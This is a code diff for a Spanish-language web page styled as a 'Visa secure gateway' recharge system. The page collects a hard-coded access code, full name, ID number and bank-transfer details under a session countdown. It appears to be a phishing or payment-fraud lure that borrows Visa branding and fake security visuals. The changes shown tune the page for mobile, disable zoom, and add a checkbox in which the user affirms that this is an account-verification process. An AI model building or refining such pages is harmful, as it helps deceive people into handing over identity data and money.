@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sistema de Recarga - Pasarela Segura Visa</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -45,6 +45,7 @@
             margin: 0;
             padding: 0;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent; /* Elimina el resaltado al tocar en móviles */
         }
         
         /* Animación de onda refinada */
@@ -68,7 +69,7 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start; /* Cambiado para mejor scroll en móvil */
             position: relative;
             overflow-x: hidden;
             letter-spacing: -0.01em;
@@ -76,6 +77,7 @@
             background-image: 
                 radial-gradient(circle at 10% 10%, rgba(26, 31, 113, 0.03) 0%, transparent 50%),
                 radial-gradient(circle at 90% 90%, rgba(247, 182, 0, 0.03) 0%, transparent 50%);
+            padding: 20px 0; /* Añadido margen superior e inferior */
         }
         
         /* Fondo animado mejorado con efecto parallax */
@@ -149,17 +151,18 @@
         /* Contenedor principal mejorado */
         .container {
             max-width: 800px;
-            margin: 30px auto;
-            padding: 20px;
+            margin: 20px auto;
+            padding: 15px;
             position: relative;
             z-index: 1;
             perspective: 1000px;
+            width: 100%; /* Asegura que ocupe todo el ancho disponible */
         }
         
         /* Encabezado con logo mejorado */
         .header {
             text-align: center;
-            margin-bottom: 45px;
+            margin-bottom: 30px;
             position: relative;
             animation: fadeInDown 1s ease-out;
         }
@@ -221,7 +224,7 @@
         }
         
         h1 {
-            font-size: 32px;
+            font-size: 28px;
             margin-bottom: 12px;
             font-weight: 700;
             background: var(--visa-gradient);
@@ -244,7 +247,7 @@
         }
         
         h2 {
-            font-size: 24px;
+            font-size: 22px;
             margin-bottom: 18px;
             font-weight: 600;
             position: relative;
@@ -279,7 +282,7 @@
             background-color: var(--card-color);
             border-radius: 20px;
             box-shadow: var(--box-shadow);
-            padding: 40px;
+            padding: 30px 25px;
             margin-bottom: 30px;
             transition: var(--transition-medium);
             display: none;
@@ -289,6 +292,7 @@
             position: relative;
             transform-style: preserve-3d;
             transform: translateZ(0) rotateX(0) rotateY(0);
+            overflow: hidden; /* Para asegurar que los contenidos no se salgan en móvil */
         }
         
         .card.active {
@@ -316,7 +320,7 @@
         
         /* Grupos de formulario mejorados */
         .form-group {
-            margin-bottom: 28px;
+            margin-bottom: 24px;
             position: relative;
             transition: var(--transition-medium);
         }
@@ -355,14 +359,17 @@
         
         input, select {
             width: 100%;
-            padding: 16px 18px;
+            padding: 14px 16px;
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 15px;
             transition: var(--transition-fast);
             background-color: var(--light-color);
             color: var(--text-color);
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02) inset;
+            -webkit-appearance: none; /* Corrige apariencia de inputs en iOS */
+            -moz-appearance: none;
+            appearance: none;
         }
         
         input:focus, select:focus {
@@ -393,7 +400,7 @@
         }
         
         .document-type {
-            width: 80px;
+            width: 70px;
             flex-shrink: 0;
             font-weight: 500;
             border-radius: 10px;
@@ -414,7 +421,7 @@
         .btn-container {
             display: flex;
             gap: 15px;
-            margin-top: 35px;
+            margin-top: 30px;
             flex-direction: row;
         }
         
@@ -423,8 +430,8 @@
             color: white;
             border: none;
             border-radius: 12px;
-            padding: 16px 24px;
-            font-size: 16px;
+            padding: 14px 20px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             transition: var(--transition-medium);
@@ -599,15 +606,15 @@
         .steps {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 40px;
+            margin-bottom: 35px;
             position: relative;
-            align-items: center; /* Mejor alineación visual */
+            align-items: center;
         }
         
         .steps::before {
             content: '';
             position: absolute;
-            top: 22px; /* Ajustado para mejor alineación */
+            top: 22px;
             left: 0;
             right: 0;
             height: 3px;
@@ -620,7 +627,7 @@
         .steps::after {
             content: '';
             position: absolute;
-            top: 22px; /* Ajustado para mejor alineación */
+            top: 22px;
             left: 0;
             height: 3px;
             background: var(--visa-accent-gradient);
@@ -637,7 +644,7 @@
         
         .step {
             position: relative;
-            z-index: 3; /* Aumentado para que esté por encima de la línea */
+            z-index: 3;
             text-align: center;
             width: 180px;
             font-weight: 500;
@@ -656,7 +663,7 @@
             font-weight: 600;
             transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
             position: relative;
-            z-index: 4; /* Aseguramos que esté por encima de todo */
+            z-index: 4;
             border: 2px solid white;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
@@ -695,28 +702,33 @@
             border-radius: 2px;
         }
         
+        /* Corregido para que el checkmark no tape el número */
         .step.completed .step-icon {
             background-color: var(--success-color);
             color: white;
             box-shadow: 0 0 0 5px rgba(23, 168, 75, 0.15);
-            transform: scale(1.1); /* Aseguramos el mismo tamaño que el paso activo */
+            transform: scale(1.1);
         }
         
         .step.completed .step-text {
             color: var(--success-color);
         }
         
-        /* Animación para el paso completado */
+        /* Animación para el paso completado - ahora con el checkmark más pequeño */
+        .step.completed .step-icon span {
+            display: none; /* Ocultamos el número */
+        }
+        
         .step.completed .step-icon::before {
             content: '✓';
             position: absolute;
-            font-size: 22px; /* Tamaño aumentado */
+            font-size: 18px;
             animation: checkmark 0.5s ease-in-out;
         }
         
         @keyframes checkmark {
             0% { transform: scale(0); }
-            50% { transform: scale(1.5); }
+            50% { transform: scale(1.3); }
             100% { transform: scale(1); }
         }
         
@@ -725,7 +737,7 @@
             background-color: var(--light-color);
             border: 1px solid var(--border-color);
             border-radius: 20px;
-            padding: 35px;
+            padding: 30px;
             margin-top: 30px;
             text-align: center;
             cursor: pointer;
@@ -823,15 +835,16 @@
         
         .payment-data-card {
             background-color: white;
-            padding: 40px;
+            padding: 30px 25px;
             border-radius: 24px;
             max-width: 550px;
-            width: 90%;
+            width: 95%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             position: relative;
             transform: translateY(30px) scale(0.95);
             transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
             overflow: hidden;
+            margin: 0 15px; /* Añadido margen para móviles */
         }
         
         .overlay.active .payment-data-card {
@@ -839,14 +852,15 @@
         }
         
         .payment-data-item {
-            margin-bottom: 20px;
-            padding-bottom: 20px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
             border-bottom: 1px solid var(--border-color);
             display: flex;
             justify-content: space-between;
             align-items: center;
             position: relative;
             transition: var(--transition-medium);
+            flex-wrap: wrap; /* Para mejor adaptación en móviles */
         }
         
         .payment-data-item:hover {
@@ -866,7 +880,8 @@
             color: var(--primary-color);
             margin-bottom: 5px;
             font-size: 15px;
-            white-space: nowrap; /* Evita que se rompa el texto */
+            white-space: nowrap;
+            min-width: 80px; /* Ancho mínimo para mejor alineación */
         }
         
         .payment-data-content {
@@ -907,7 +922,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-top: 35px;
+            margin-top: 30px;
             gap: 12px;
             padding: 16px;
             border-radius: 16px;
@@ -916,6 +931,7 @@
             transition: var(--transition-medium);
             position: relative;
             overflow: hidden;
+            flex-wrap: wrap; /* Para mejor adaptación en móviles */
         }
         
         .visa-security:hover {
@@ -955,11 +971,12 @@
         }
         
         .security-text {
-            font-size: 14px;
+            font-size: 13px;
             color: var(--text-secondary);
             font-weight: 500;
             transition: var(--transition-fast);
             z-index: 2;
+            text-align: center; /* Para centrar en móvil */
         }
         
         .visa-security:hover .security-text {
@@ -1215,10 +1232,10 @@
             right: 20px;
             background-color: var(--primary-color);
             color: white;
-            padding: 12px 18px;
+            padding: 10px 16px;
             border-radius: 12px;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 15px;
             display: none;
             z-index: 3000;
             box-shadow: 0 8px 20px rgba(26, 31, 113, 0.3);
@@ -1260,7 +1277,7 @@
             border: 1px solid var(--border-color);
             border-radius: 12px;
             padding: 12px 18px;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             transition: var(--transition-medium);
@@ -1367,17 +1384,17 @@
         .bank-logos-container {
             display: flex;
             flex-wrap: wrap;
-            gap: 15px;
+            gap: 10px;
             justify-content: center;
             margin: 20px 0;
         }
 
         .bank-logo {
-            width: 75px;
-            height: 45px;
+            width: 65px;
+            height: 40px;
             border-radius: 12px;
             border: 1px solid var(--border-color);
-            padding: 8px;
+            padding: 6px;
             background-color: white;
             cursor: pointer;
             transition: var(--transition-medium);
@@ -1718,9 +1735,9 @@
         /* Checkbox de confirmación de transferencia */
         .confirmation-checkbox {
             display: flex;
-            align-items: center;
+            align-items: flex-start; /* Alineación superior para mejor lectura */
             gap: 12px;
-            margin: 25px 0;
+            margin: 20px 0;
             padding: 15px;
             background-color: rgba(247, 182, 0, 0.1);
             border-radius: 12px;
@@ -1744,6 +1761,7 @@
             transition: var(--transition-fast);
             background-color: white;
             flex-shrink: 0;
+            margin-top: 2px; /* Ajuste fino para alineación vertical */
         }
         
         .custom-checkbox.checked::before {
@@ -1819,6 +1837,7 @@
             height: 300px;
             z-index: -1;
             opacity: 0.5;
+            pointer-events: none; /* Asegura que no interfiera con los clics */
         }
         
         .orb {
@@ -1902,29 +1921,80 @@
             }
         }
         
+        /* Checkbox de entendimiento del proceso */
+        .understanding-checkbox {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(0, 85, 200, 0.05); /* Color azul acento */
+            border-radius: 12px;
+            border: 1px solid var(--accent-color-light);
+            transition: var(--transition-medium);
+        }
+        
+        .understanding-checkbox:hover {
+            background-color: rgba(0, 85, 200, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 85, 200, 0.1);
+        }
+        
+        .understanding-checkbox .custom-checkbox {
+            border-color: var(--accent-color);
+        }
+        
+        .understanding-checkbox .custom-checkbox.checked {
+            border-color: var(--accent-color);
+        }
+        
+        .understanding-checkbox .custom-checkbox.checked::before {
+            color: var(--accent-color);
+        }
+        
         /* Estilos para dispositivos móviles mejorados */
         @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+                margin: 10px auto;
+            }
+            
             .card {
-                padding: 30px 20px;
+                padding: 25px 15px;
+                margin-bottom: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            h2 {
+                font-size: 20px;
+            }
+            
+            p {
+                font-size: 14px;
             }
             
             .btn-container {
                 flex-direction: column-reverse;
-                gap: 12px;
+                gap: 10px;
+            }
+            
+            .btn {
+                padding: 12px 16px;
+                font-size: 14px;
             }
             
             .steps {
                 flex-direction: column;
                 align-items: flex-start;
-                gap: 15px;
-                margin-left: 10px;
+                gap: 12px;
+                margin-left: 5px;
+                margin-bottom: 30px;
             }
             
-            .steps::before {
-                display: none;
-            }
-            
-            .steps::after {
+            .steps::before, .steps::after {
                 display: none;
             }
             
@@ -1945,6 +2015,12 @@
                 margin: 0;
                 width: 35px;
                 height: 35px;
+                font-size: 14px;
+            }
+            
+            .step-text {
+                text-align: left;
+                font-size: 13px;
             }
             
             .session-timer {
@@ -1953,34 +2029,102 @@
                 padding: 8px 12px;
                 font-size: 14px;
             }
-
+            
             .bank-logos-container {
                 gap: 8px;
             }
-
+            
             .bank-logo {
-                width: 65px;
-                height: 40px;
-            }
-            
-            h1 {
-                font-size: 26px;
-            }
-            
-            h1::after {
-                width: 80px;
-            }
-            
-            h2 {
-                font-size: 20px;
+                width: 60px;
+                height: 38px;
+                padding: 5px;
             }
             
             .payment-data-card {
-                padding: 30px 20px;
+                padding: 25px 15px;
+                width: 95%;
+                margin: 0 10px;
             }
             
-            .overlay.active .payment-data-card {
-                width: 95%;
+            .payment-data-item {
+                padding-bottom: 10px;
+                margin-bottom: 10px;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .payment-data-label {
+                margin-bottom: 8px;
+            }
+            
+            .payment-data-content {
+                padding-left: 0;
+                width: 100%;
+            }
+            
+            .btn-copy {
+                position: absolute;
+                right: 5px;
+                top: 5px;
+            }
+            
+            .data-display-container {
+                width: 100%;
+                padding-left: 0;
+            }
+            
+            .copy-button {
+                margin-top: 10px;
+            }
+            
+            .form-group:hover {
+                transform: none; /* Eliminar animación en móvil */
+            }
+            
+            .visa-security {
+                flex-direction: column;
+                padding: 12px;
+                text-align: center;
+            }
+            
+            .security-text {
+                text-align: center;
+            }
+            
+            .concept-alert {
+                padding: 12px;
+            }
+            
+            .concept-alert i {
+                font-size: 18px;
+            }
+            
+            /* Corrección para los checkboxes en móvil */
+            .confirmation-checkbox, .understanding-checkbox {
+                padding: 12px;
+            }
+            
+            .custom-checkbox {
+                min-width: 22px;
+                min-height: 22px;
+            }
+            
+            .confirmation-text {
+                font-size: 14px;
+            }
+            
+            /* Mejorar visibilidad de los pasos en móvil */
+            .step.completed .step-icon::before {
+                font-size: 16px;
+            }
+            
+            /* Ajustar tamaño del orbe para móvil */
+            .orb-container {
+                top: -100px;
+                right: -100px;
+                width: 200px;
+                height: 200px;
+                opacity: 0.3; /* Más sutil en móvil */
             }
         }
         
@@ -2049,19 +2193,19 @@
         
         <div class="steps" data-progress="1" id="progress-steps">
             <div class="step active" id="step-1">
-                <div class="step-icon">1</div>
+                <div class="step-icon"><span>1</span></div>
                 <div class="step-text">Inicio de Sesión</div>
             </div>
             <div class="step" id="step-2">
-                <div class="step-icon">2</div>
+                <div class="step-icon"><span>2</span></div>
                 <div class="step-text">Datos Personales</div>
             </div>
             <div class="step" id="step-3">
-                <div class="step-icon">3</div>
+                <div class="step-icon"><span>3</span></div>
                 <div class="step-text">Información de Recarga</div>
             </div>
             <div class="step" id="step-4">
-                <div class="step-icon">4</div>
+                <div class="step-icon"><span>4</span></div>
                 <div class="step-text">Detalles de Transferencia</div>
             </div>
         </div>
@@ -2069,7 +2213,14 @@
         <!-- Formulario de Inicio de Sesión -->
         <div class="card active" id="login-form">
             <h2>Ingreso al Sistema</h2>
-            <p>Ingrese su clave de acceso y nombre para continuar con el proceso de activación</p>
+            <p>Ingrese sus datos para continuar con el proceso de activación</p>
+            
+            <!-- Reordenado: nombre primero, luego clave -->
+            <div class="form-group">
+                <label for="user-name">Nombre Completo:</label>
+                <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="name-error"></div>
+            </div>
             
             <div class="form-group">
                 <label for="access-code">Clave de Acceso:</label>
@@ -2077,14 +2228,14 @@
                 <div class="error-message" id="code-error"></div>
             </div>
             
-            <div class="form-group">
-                <label for="user-name">Nombre Completo:</label>
-                <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
-                <div class="error-message" id="name-error"></div>
+            <!-- Checkbox para confirmar entendimiento del proceso -->
+            <div class="understanding-checkbox">
+                <div class="custom-checkbox" id="understanding-checkbox" onclick="toggleUnderstandingCheckbox()"></div>
+                <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
             </div>
             
             <div class="btn-container">
-                <button class="btn" onclick="validateLogin()">
+                <button class="btn" id="login-btn" onclick="validateLogin()" disabled>
                     Continuar
                     <i class="fas fa-arrow-right"></i>
                 </button>
@@ -2130,7 +2281,7 @@
                         <option value="E">E</option>
                         <option value="J">J</option>
                     </select>
-                    <input type="text" id="id-number" placeholder="Ingrese su número de identidad">
+                    <input type="text" id="id-number" placeholder="Ingrese su número de identidad" inputmode="numeric" pattern="[0-9]*">
                 </div>
                 <div class="error-message" id="id-error"></div>
             </div>
@@ -2222,6 +2373,7 @@
             </div>
 
             <div class="form-group">
+                <div class="form-group">
                 <label for="transfer-amount">Monto Recargado: <span class="badge badge-accent" id="amount-currency">Bs</span></label>
                 <input type="text" id="transfer-amount" disabled>
                 <div class="error-message" id="amount-error"></div>
@@ -2237,7 +2389,7 @@
             
             <div class="form-group">
                 <label for="transfer-reference">Número de Referencia:</label>
-                <input type="text" id="transfer-reference" placeholder="Ingrese el número de referencia de la transferencia">
+                <input type="text" id="transfer-reference" placeholder="Ingrese el número de referencia de la transferencia" inputmode="numeric" pattern="[0-9]*">
                 <div class="error-message" id="reference-error"></div>
             </div>
             
@@ -2449,6 +2601,7 @@
         let particles = [];
         let selectedAmount = 25; // Valor predeterminado
         let transferConfirmed = false; // Estado para el checkbox de confirmación
+        let understandingConfirmed = false; // Estado para el checkbox de entendimiento
         
         // Mostrar primer formulario al cargar
         document.addEventListener('DOMContentLoaded', function() {
@@ -2463,6 +2616,32 @@
             initButtonEffects();
             // Añadir líneas de interferencia aleatorias para el overlay
             createInterferenceLines();
+            
+            // Definir restricción de zoom en dispositivos móviles para evitar problemas de UI
+            document.addEventListener('touchmove', function(event) {
+                if (event.scale !== 1) {
+                    event.preventDefault();
+                }
+            }, { passive: false });
+            
+            // Establecer la fecha actual en el campo de fecha por defecto
+            const today = new Date();
+            const formattedDate = today.toISOString().substr(0, 10);
+            if (document.getElementById('transfer-date')) {
+                document.getElementById('transfer-date').value = formattedDate;
+            }
+            
+            // Prevenir auto zoom en inputs para dispositivos móviles
+            const inputs = document.querySelectorAll('input, select');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    // En iOS esto ayuda a prevenir el zoom automático
+                    input.setAttribute('readonly', 'true');
+                    setTimeout(function() {
+                        input.removeAttribute('readonly');
+                    }, 50);
+                });
+            });
         });
         
         // Inicializar efectos para botones
@@ -2549,6 +2728,8 @@
         // Sistema de partículas para protección de datos
         function initParticles() {
             const canvas = document.getElementById('particles-canvas');
+            if (!canvas) return; // Verificación para evitar errores
+            
             const ctx = canvas.getContext('2d');
             
             function resizeCanvas() {
@@ -2624,13 +2805,16 @@
             }
             
             // Iniciar animación cuando se muestra el overlay
-            document.getElementById('payment-overlay').addEventListener('transitionend', function() {
-                if (this.classList.contains('active')) {
-                    resizeCanvas();
-                    createParticles();
-                    animateParticles();
-                }
-            });
+            const paymentOverlay = document.getElementById('payment-overlay');
+            if (paymentOverlay) {
+                paymentOverlay.addEventListener('transitionend', function() {
+                    if (this.classList.contains('active')) {
+                        resizeCanvas();
+                        createParticles();
+                        animateParticles();
+                    }
+                });
+            }
         }
         
         // Actualizar la visualización del monto
@@ -2638,7 +2822,9 @@
             const bsAmount = (selectedAmount * dollarRate).toFixed(2);
             const formattedBsAmount = formatNumberWithCommas(bsAmount);
             
-            document.getElementById('secure-amount').textContent = `${formattedBsAmount} Bs`;
+            if (document.getElementById('secure-amount')) {
+                document.getElementById('secure-amount').textContent = `${formattedBsAmount} Bs`;
+            }
             
             // También actualizar el valor en el formulario de detalles
             if (document.getElementById('transfer-amount')) {
@@ -2649,6 +2835,7 @@
         // Cargar logos de bancos
         function loadBankLogos() {
             const container = document.getElementById('bank-logos');
+            if (!container) return; // Verificación para evitar errores
             
             bankList.forEach((bank, index) => {
                 const logoDiv = document.createElement('div');
@@ -2676,7 +2863,7 @@
         // Crear líneas de interferencia aleatorias
         function createInterferenceLines() {
             const container = document.querySelector('.payment-data-card');
-            if (!container) return;
+            if (!container) return; // Verificación para evitar errores
             
             const existingLines = document.querySelectorAll('.interference-line');
             
@@ -2704,6 +2891,8 @@
             const checkbox = document.getElementById('transfer-checkbox');
             const continueButton = document.getElementById('continue-button');
             
+            if (!checkbox) return; // Verificación para evitar errores
+            
             transferConfirmed = !transferConfirmed;
             
             if (transferConfirmed) {
@@ -2715,22 +2904,34 @@
             }
         }
         
+        // Toggle checkbox para entendimiento del proceso
+        function toggleUnderstandingCheckbox() {
+            const checkbox = document.getElementById('understanding-checkbox');
+            const loginButton = document.getElementById('login-btn');
+            
+            if (!checkbox || !loginButton) return; // Verificación para evitar errores
+            
+            understandingConfirmed = !understandingConfirmed;
+            
+            if (understandingConfirmed) {
+                checkbox.classList.add('checked');
+                loginButton.disabled = false;
+            } else {
+                checkbox.classList.remove('checked');
+                loginButton.disabled = true;
+            }
+        }
+        
         // Validar inicio de sesión
         function validateLogin() {
+            if (!understandingConfirmed) {
+                alert("Por favor confirme que entiende el proceso marcando la casilla correspondiente.");
+                return;
+            }
+            
             const accessCode = document.getElementById('access-code').value;
             const userName = document.getElementById('user-name').value;
             let isValid = true;
-            
-            // Validar código de acceso
-            if (accessCode.trim() === '') {
-                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
-                isValid = false;
-            } else if (accessCode !== '11478512043547896520') {
-                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Código de acceso incorrecto';
-                isValid = false;
-            } else {
-                document.getElementById('code-error').textContent = '';
-            }
             
             // Validar nombre
             if (userName.trim() === '') {
@@ -2738,6 +2939,17 @@
                 isValid = false;
             } else {
                 document.getElementById('name-error').textContent = '';
+            }
+            
+            // Validar código de acceso
+            if (accessCode.trim() === '') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
+                isValid = false;
+            } else if (accessCode !== '17478512043547896520') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Código de acceso incorrecto';
+                isValid = false;
+            } else {
+                document.getElementById('code-error').textContent = '';
             }
             
             // Si todo es válido, pasar al siguiente paso
@@ -2825,6 +3037,9 @@
         function showPaymentData() {
             document.getElementById('payment-overlay').classList.add('active');
             
+            // Evitar scroll del body cuando el overlay está activo
+            document.body.style.overflow = 'hidden';
+            
             // Actualizar el monto según la selección
             updateAmountDisplay();
             
@@ -2835,6 +3050,9 @@
         // Ocultar overlay
         function hidePaymentData() {
             document.getElementById('payment-overlay').classList.remove('active');
+            
+            // Restaurar scroll del body
+            document.body.style.overflow = '';
         }
         
         // Función para copiar al portapapeles
@@ -2907,6 +3125,8 @@
         function startSessionTimer() {
             const timerElement = document.getElementById('session-timer');
             const countdownElement = document.getElementById('countdown');
+            
+            if (!timerElement || !countdownElement) return; // Verificación para evitar errores
             
             // Mostrar el temporizador
             timerElement.classList.add('active');
@@ -3033,7 +3253,10 @@
             let redirectCounter = 40;
             const redirectCountdown = setInterval(() => {
                 redirectCounter--;
-                document.getElementById('redirect-countdown').textContent = redirectCounter;
+                const element = document.getElementById('redirect-countdown');
+                if (element) {
+                    element.textContent = redirectCounter;
+                }
                 
                 if (redirectCounter <= 0) {
                     clearInterval(redirectCountdown);
